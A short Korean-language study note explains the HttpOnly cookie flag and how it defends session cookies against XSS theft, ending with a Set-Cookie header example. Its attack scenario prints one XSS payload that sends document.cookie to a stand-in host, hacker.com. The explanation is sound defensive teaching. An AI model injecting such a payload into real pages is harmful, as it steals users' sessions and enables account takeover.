# HttpOnly Cookie

## 1. 개요
`HttpOnly` 쿠키는 브라우저 보안 설정을 돕는 플래그(Flag) 중 하나입니다. 서버에서 쿠키를 생성할 때 이 옵션을 추가하면, 해당 쿠키는 **클라이언트 사이드 자바스크립트(JavaScript)에서 접근이 불가능**해집니다.

- **일반 쿠키:** `document.cookie`로 조회 및 수정 가능
- **HttpOnly 쿠키:** HTTP 요청 헤더를 통해서만 서버로 전달되며, JS 접근 차단

---

## 2. 도입 배경: XSS 공격 방어
가장 핵심적인 이유는 **XSS(Cross-Site Scripting)** 공격으로부터 사용자의 민감한 정보(세션 ID, 인증 토큰 등)를 보호하기 위해서입니다.

### 공격 시나리오 (XSS)
1. 해커가 웹사이트 게시판 등에 악성 스크립트 삽입: 
   `<script>location.href='https://hacker.com/steal?cookie=' + document.cookie</script>`
2. 사용자가 해당 페이지 방문 시 스크립트 자동 실행.
3. **결과:** 사용자의 세션 정보가 해커에게 전송되어 계정 탈취(Session Hijacking) 발생.

> **💡 HttpOnly가 설정되어 있다면?**
> 스크립트가 실행되어도 `document.cookie` 결과값에 인증 쿠키가 포함되지 않으므로 탈취가 불가능합니다.

---

## 3. 기술적 특징 및 설정 방법

### 서버 응답 헤더 예시
```http
Set-Cookie: access_token=abc12345; HttpOnly; Secure; SameSite=Lax; Path=/;
